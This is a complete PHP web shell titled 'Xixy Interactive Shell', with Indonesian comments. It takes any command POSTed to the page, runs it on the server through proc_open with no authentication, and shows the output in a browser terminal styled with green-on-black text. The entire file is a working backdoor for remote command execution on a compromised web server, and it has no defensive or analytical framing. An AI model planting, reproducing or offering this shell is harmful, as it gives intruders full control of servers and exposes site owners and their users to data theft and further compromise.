<?php
session_start();

// Inisialisasi Current Working Directory
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cmd = $_POST['cmd'] ?? '';
    $cwd = $_SESSION['cwd'];

    // Penanganan khusus perintah 'cd'
    if (preg_match('/^cd\s+(.+)/', $cmd, $match)) {
        $dir = trim($match[1]);
        $new_dir = ($dir[0] === '/') ? $dir : $cwd . '/' . $dir;
        if (is_dir($new_dir)) {
            $_SESSION['cwd'] = realpath($new_dir);
            die("CWD_CHANGED:" . $_SESSION['cwd']);
        }
        die("Error: Directory not found.");
    }

    // Eksekusi menggunakan proc_open
    $descriptorspec = array(
        0 => array("pipe", "r"), // stdin
        1 => array("pipe", "w"), // stdout
        2 => array("pipe", "w")  // stderr
    );

    $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);

    if (is_resource($process)) {
        fclose($pipes[0]); // Tutup stdin karena kita tidak pakai input interaktif di sini

        $stdout = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        proc_close($process);

        echo $stdout;
        if ($stderr) echo "\n[Error/Stderr]:\n" . $stderr;
    } else {
        echo "Error: Could not open process.";
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Xixy Interactive Shell</title>
    <style>
        body { background: #0c0c0c; color: #00ff41; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
        #terminal { width: 100%; max-width: 900px; margin: 0 auto; background: #000; border: 1px solid #333; box-shadow: 0 0 20px rgba(0,255,65,0.1); border-radius: 5px; overflow: hidden; }
        #output { height: 450px; overflow-y: auto; padding: 15px; white-space: pre-wrap; word-wrap: break-word; font-size: 14px; border-bottom: 1px solid #222; }
        #input-line { display: flex; padding: 10px 15px; background: #050505; }
        #prompt { color: #888; margin-right: 10px; font-weight: bold; white-space: nowrap; }
        #cmd { background: transparent; border: none; color: #fff; font-family: inherit; font-size: 14px; width: 100%; outline: none; }
        .cmd-history { color: #008f11; font-weight: bold; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-thumb { background: #222; border-radius: 10px; }
    </style>
</head>
<body>

<div id="terminal">
    <div id="output">--- Xixy Pro Terminal Loaded (proc_open mode) ---
Silakan ketik perintah (contoh: ls -la, uname -a, dsb)</div>
    <div id="input-line">
        <span id="prompt"><?php echo $_SESSION['cwd']; ?> $</span>
        <input type="text" id="cmd" autofocus spellcheck="false">
    </div>
</div>

<script>
const outputDiv = document.getElementById('output');
const cmdInput = document.getElementById('cmd');
const promptSpan = document.getElementById('prompt');

cmdInput.addEventListener('keydown', async (e) => {
    if (e.key === 'Enter') {
        const fullCmd = cmdInput.value.trim();
        if (!fullCmd) return;

        // Tampilkan perintah di layar
        outputDiv.innerHTML += `\n<span class="cmd-history">$ ${fullCmd}</span>\n`;
        cmdInput.value = '';
        outputDiv.scrollTop = outputDiv.scrollHeight;

        try {
            const formData = new FormData();
            formData.append('cmd', fullCmd);

            const response = await fetch('', { method: 'POST', body: formData });
            const result = await response.text();

            // Cek jika direktori berubah
            if (result.startsWith('CWD_CHANGED:')) {
                const newPath = result.replace('CWD_CHANGED:', '');
                promptSpan.innerText = newPath + ' $';
                outputDiv.innerHTML += `Changed directory to: ${newPath}\n`;
            } else {
                outputDiv.innerHTML += result + "\n";
            }
        } catch (err) {
            outputDiv.innerHTML += `<span style="color:red">Connection Error: ${err}</span>\n`;
        }
        outputDiv.scrollTop = outputDiv.scrollHeight;
    }
});
</script>
</body>
</html>
